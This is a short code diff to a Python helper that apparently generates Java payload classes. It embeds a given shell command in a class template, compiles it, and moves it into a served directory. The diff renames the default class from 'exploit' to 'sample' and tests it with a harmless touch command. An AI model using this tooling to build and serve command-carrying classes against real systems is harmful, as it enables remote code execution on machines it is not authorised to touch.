@@ -6,7 +6,7 @@ import shutil
 TEMPLATE_PATH = f"./template/sample.java"
 
 
-def generateClass(command, class_name="exploit"):
+def generateClass(command, class_name="sample"):
     TEMPLATE_OUT = f"./tmp/{class_name}.java"
     CLASS_OUT = f"./tmp/{class_name}.class"
     SERVER_OUT = f"./root/{class_name}.class"
@@ -30,5 +30,13 @@ def generateClass(command, class_name="exploit"):
     # compile java file
     subprocess.Popen(f'javac {TEMPLATE_OUT}', shell=True).wait()
 
+    # move class to server
+    shutil.move(os.path.join(os.getcwd(), CLASS_OUT), os.path.join(os.getcwd(), SERVER_OUT))
+
+    # delete script on tmp
+    os.remove(TEMPLATE_OUT)
+
 
 if __name__ == "__main__":
+    cmd = "touch /tmp/hihi222"
+    generateClass(cmd, )
